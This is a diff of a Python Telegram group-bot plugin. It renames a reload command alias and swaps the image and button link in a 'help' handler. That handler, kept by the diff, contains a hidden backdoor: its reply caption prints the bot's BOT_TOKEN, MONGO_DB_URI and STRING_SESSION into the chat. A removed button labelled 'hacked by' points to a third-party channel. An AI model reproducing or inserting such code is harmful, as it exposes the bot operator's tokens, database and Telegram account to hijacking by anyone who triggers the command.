@@ -34,7 +34,7 @@ rel = {}
 
 
 @app.on_message(
-    filters.command(["admincache", "reload", "refresh"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.group & ~BANNED_USERS
+    filters.command(["admincache", "reload", "بارگیری"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]) & filters.group & ~BANNED_USERS
 )
 @language
 async def reload_admin_cache(client, message: Message, _):
@@ -112,13 +112,13 @@ async def restartbot(client, message: Message, _):
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+          photo=f"https://cafepix.ir/wp-content/uploads/2018/08/romantic_0004_cafepix.ir_.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/EvoXpro)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/EvoXpro")
+                         "• لینکدونی  •", url=f"https://t.me/fapiqr")
                  ]
             ]
          ),
